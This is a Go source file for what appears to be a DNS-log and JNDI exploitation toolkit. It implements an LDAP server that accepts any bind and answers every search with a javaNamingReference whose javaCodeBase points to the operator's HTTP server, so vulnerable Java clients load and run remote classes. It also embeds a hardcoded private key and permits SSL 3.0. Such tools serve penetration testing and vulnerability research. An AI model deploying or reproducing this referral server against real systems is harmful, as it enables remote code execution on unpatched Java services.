package protocol

import (
	"DnsLog/config"
	"crypto/tls"
	"fmt"
	ldapMessage "github.com/lor00x/goldap/message"
	"github.com/sirupsen/logrus"
	ldap "github.com/vjeantet/ldapserver"
	"strings"
)

// Most routes handlers are taken from the example at https://github.com/vjeantet/ldapserver/blob/master/examples/complex/main.go

func init() {
	ldap.Logger = ldap.DiscardingLogger
}

// LDAPServer is a ldap server instance
type LDAPServer struct {
	WithLogger bool
	options    *config.Options
	server     *ldap.Server
	tlsConfig  *tls.Config
}

// NewLDAPServer returns a new LDAP server.
func NewLDAPServer(options *config.Options, withLogger bool) (*LDAPServer, error) {
	ldapServer := &LDAPServer{options: options, WithLogger: withLogger}

	routes := ldap.NewRouteMux()
	routes.Bind(ldapServer.handleBind)
	routes.Search(ldapServer.handleSearch)

	server := ldap.NewServer()
	server.Handle(routes)
	ldapServer.server = server

	return ldapServer, nil
}

// handleBind is a handler for bind requests
func (ldapServer *LDAPServer) handleBind(w ldap.ResponseWriter, m *ldap.Message) {
	r := m.GetBindRequest()
	res := ldap.NewBindResponse(ldap.LDAPResultSuccess)
	var message strings.Builder
	message.WriteString("Type=Bind\n")
	message.WriteString(fmt.Sprintf("AuthenticationChoice=%s\n", r.AuthenticationChoice()))
	message.WriteString(fmt.Sprintf("User=%s\n", r.Name()))
	message.WriteString(fmt.Sprintf("Pass=%s\n", r.Authentication()))
	w.Write(res)

}

// ListenAndServe listens on ldap ports for the server.
func (ldapServer *LDAPServer) ListenAndServe(tlsConfig *tls.Config) {
	ldapServer.tlsConfig = tlsConfig
	logrus.Infof("LDAP ON %s %d \n", ldapServer.options.ListenIP, ldapServer.options.LdapPort)
	err := ldapServer.server.ListenAndServe(fmt.Sprintf("%s:%d", ldapServer.options.ListenIP, ldapServer.options.LdapPort))
	if err != nil {
		logrus.Errorf("Could not serve ldap on port 10389: %s\n", err)
	}
}

// handleSearch is a handler for search requests
func (ldapServer *LDAPServer) handleSearch(w ldap.ResponseWriter, m *ldap.Message) {

	r := m.GetSearchRequest()

	var message strings.Builder
	message.WriteString("Type=Search\n")
	baseObject := r.BaseObject()
	message.WriteString(fmt.Sprintf("BaseDn=%s\n", baseObject))
	logrus.Infof("DN: %s", baseObject)
	message.WriteString(fmt.Sprintf("Filter=%s\n", r.Filter()))
	message.WriteString(fmt.Sprintf("FilterString=%s\n", r.FilterString()))
	message.WriteString(fmt.Sprintf("Attributes=%s\n", r.Attributes()))
	message.WriteString(fmt.Sprintf("TimeLimit=%d\n", r.TimeLimit().Int()))
	e := ldap.NewSearchResultEntry(string(baseObject))
	u := fmt.Sprintf("http://%s:%d/java/%s/", config.OptionsConfig.IPAddress, config.OptionsConfig.ManagePort, string(baseObject))
	logrus.Infof("Redirect : %s", u)
	e.AddAttribute("objectClass", "javaNamingReference")
	e.AddAttribute("javaClassName", "Main") //could be any unknown
	e.AddAttribute("javaFactory", "Main")   //could be any unknown
	// 这里的javaFactory 作为key  可以通过url 设置目录 但是一定要带反斜杠 不然拼接错误
	e.AddAttribute("javaCodeBase", ldapMessage.AttributeValue(u))
	w.Write(e)
	res := ldap.NewSearchResultDoneResponse(ldap.LDAPResultSuccess)
	w.Write(res)
}

func (ldapServer *LDAPServer) Close() error {
	return ldapServer.server.Listener.Close()
}

// localhostCert is a PEM-encoded TLS cert with SAN DNS names
// "127.0.0.1" and "[::1]", expiring at the last second of 2049 (the end
// of ASN.1 time).
var localhostCert = []byte(`-----BEGIN CERTIFICATE-----
MIIBOTCB5qADAgECAgEAMAsGCSqGSIb3DQEBBTAAMB4XDTcwMDEwMTAwMDAwMFoX
DTQ5MTIzMTIzNTk1OVowADBaMAsGCSqGSIb3DQEBAQNLADBIAkEAsuA5mAFMj6Q7
qoBzcvKzIq4kzuT5epSp2AkcQfyBHm7K13Ws7u+0b5Vb9gqTf5cAiIKcrtrXVqkL
8i1UQF6AzwIDAQABo08wTTAOBgNVHQ8BAf8EBAMCACQwDQYDVR0OBAYEBAECAwQw
DwYDVR0jBAgwBoAEAQIDBDAbBgNVHREEFDASggkxMjcuMC4wLjGCBVs6OjFdMAsG
CSqGSIb3DQEBBQNBAJH30zjLWRztrWpOCgJL8RQWLaKzhK79pVhAx6q/3NrF16C7
+l1BRZstTwIGdoGId8BRpErK1TXkniFb95ZMynM=
-----END CERTIFICATE-----
`)

// localhostKey is the private key for localhostCert.
var localhostKey = []byte(`-----BEGIN RSA PRIVATE KEY-----
MIIBPQIBAAJBALLgOZgBTI+kO6qAc3LysyKuJM7k+XqUqdgJHEH8gR5uytd1rO7v
tG+VW/YKk3+XAIiCnK7a11apC/ItVEBegM8CAwEAAQJBAI5sxq7naeR9ahyqRkJi
SIv2iMxLuPEHaezf5CYOPWjSjBPyVhyRevkhtqEjF/WkgL7C2nWpYHsUcBDBQVF0
3KECIQDtEGB2ulnkZAahl3WuJziXGLB+p8Wgx7wzSM6bHu1c6QIhAMEp++CaS+SJ
/TrU0zwY/fW4SvQeb49BPZUF3oqR8Xz3AiEA1rAJHBzBgdOQKdE3ksMUPcnvNJSN
poCcELmz2clVXtkCIQCLytuLV38XHToTipR4yMl6O+6arzAjZ56uq7m7ZRV0TwIh
AM65XAOw8Dsg9Kq78aYXiOEDc5DL0sbFUu/SlmRcCg93
-----END RSA PRIVATE KEY-----
`)

// getTLSconfig returns a tls configuration used to build a TLSlistener for TLS or StartTLS
func (ldapServer *LDAPServer) getTLSconfig() (*tls.Config, error) {
	if ldapServer.tlsConfig == nil {
		cert, err := tls.X509KeyPair(localhostCert, localhostKey)
		if err != nil {
			return &tls.Config{InsecureSkipVerify: true}, err
		}
		// SSL3.0 support is fine as we might be interacting with jurassic java
		return &tls.Config{
			MinVersion:   tls.VersionSSL30, //nolint
			MaxVersion:   tls.VersionTLS12,
			Certificates: []tls.Certificate{cert},
			ServerName:   "127.0.0.1",
		}, nil
	}

	return ldapServer.tlsConfig, nil
}
